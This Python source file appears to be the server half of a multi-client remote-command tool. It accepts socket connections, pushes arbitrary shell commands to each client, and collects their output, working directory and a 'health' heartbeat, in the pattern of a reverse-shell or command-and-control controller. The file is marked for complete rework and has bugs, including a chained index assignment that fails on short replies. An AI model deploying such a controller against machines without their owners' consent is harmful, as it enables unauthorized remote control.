import datetime
import socket
import time
from Server.Module import ThreadHandler as ThHa


class SocketHandler:  # TODO COMPLETE REWORK

    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connection_list = []
        self.health = None

    def handler(self):
        # create a socket object
        sock = socket.socket()
        # bind the socket to all IP addresses of this host
        sock.bind((self.server_host, self.server_port))
        sock.listen(5)
        while True:
            # accept any connections attempted
            client_sock, client_ip = sock.accept()
            current_client = ClientHandler(client_sock, client_ip)
            self.connection_list.append([current_client, None, None])

    def looker(self, time_out=1):

        while True:
            for connection in self.connection_list:
                if not connection[1]:
                    connection[1] = ThHa.create_Thread(connection[0].handler)
            time.sleep(time_out)


class ClientHandler:  # TODO COMPLETE REWORK

    def __init__(self, socket, ip):
        self.ENCODING = 'utf-8'
        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
        self.SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
        self.socket = socket
        self.ip = ip
        self.command = ''
        self.current_dir = ''
        self.last_response = ''
        self.id = None
        self.health = None

    def set_command(self, command):
        self.command = command
        return bool(self.health)

    def set_last_response(self, message=''):
        self.last_response = message
        return bool(self.health)

    def get_last_response(self):
        return self.last_response

    def get_id(self):
        return self.id

    def get_health(self, update_health=False):
        if update_health:
            self.update_health_status()
        if self.health:
            out = datetime.datetime.now().timestamp() - self.health
            if out < 10:
                return float(str(out)[:4])
            else:
                return int(out)
        else:
            return -1

    def get_current_dir(self):
        return self.current_dir

    def handler(self):
        # receiving the current working directory of the client
        self.last_response, self.current_dir, self.id = self.retrieve_data()
        while True:

            # Look if a command have been set to be push, if not get health
            if not self.command:
                self.update_health_status()
                continue
            # Strip command of leading and ending space (make ' exec dir' work)
            self.command = self.command.strip()
            if self.command.lower() == 'exit':
                break  # ...then if the command is exit, just break out of the loop

            # Send command to client and retrieve response
            response = self.post_command(self.command, retrieve_response=True)
            self.last_response, self.current_dir, self.id = response[0], response[1], response[2]

    def post_command(self, command: str, retrieve_response=True):
        """
        :param command: Command to send to the server
        :param retrieve_response: Retrieve data if true
        :return: (last_response,current_dir,id) if with_response else None
        """
        # Send command
        self.socket.send((command.encode()))

        # Clear command
        self.command = ''

        if retrieve_response:
            # return = last_response,current_dir,id
            return self.retrieve_data()
        else:
            return None

    def retrieve_data(self, set_object=True):
        # Get response from Client
        response = self.socket.recv(self.BUFFER_SIZE).decode(encoding=self.ENCODING).split(self.SEPARATOR)

        # Split response  --->  response = [cmd_response, current_dir, id]
        last_response = response[0] if response else ':ERR:'
        current_dir = response[1] if len(response) > 1 else ':LUNA:'
        id = response[2] = response[2] if len(response) > 2 else ':ROG:'

        # Return response list
        return [last_response, current_dir, id]

    def update_health_status(self, sleep_time: float = 1):
        """
         :param sleep_time: additional waiting time
        """
        try:
            # set LOCAL command to health
            command = 'health'

            # response = [cmd_response, current_dir, id]
            response = self.post_command(command, retrieve_response=True)

            # TODO get/set
            try:
                self.health = float(response[0])
            except:
                self.health = 999999999
            self.current_dir = response[1]
            self.id = response[2]

            time.sleep(sleep_time)
            return response[0]

        except:
            return 0

    def close(self):
        self.socket.close()  # close server connection
